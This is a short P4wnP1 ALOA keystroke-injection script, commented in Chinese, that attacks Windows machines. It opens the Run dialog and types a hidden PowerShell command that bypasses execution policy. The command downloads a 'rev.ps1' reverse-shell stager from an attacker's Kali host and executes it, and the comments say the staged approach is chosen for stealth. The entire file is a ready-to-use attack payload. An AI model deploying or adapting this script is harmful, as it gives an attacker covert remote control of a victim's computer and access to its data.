// P4WNP1 ALOA - Windows Reverse Shell (Staged)
// 分阶段方案 - 通过HTTP下载执行，更隐蔽

// ===== CONFIG =====
var LISTENER_IP = "192.168.146.145";  // Kali 攻击机 IP
var HTTP_PORT = "80";                  // HTTP 服务器端口
// ==================

layout("US");
typingSpeed(0,0);

// 打开运行窗口
press("GUI r");
delay(500);

// PowerShell 下载并执行
type("powershell -nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://" + LISTENER_IP + ":" + HTTP_PORT + "/rev.ps1')\"");
delay(300);

press("ENTER");
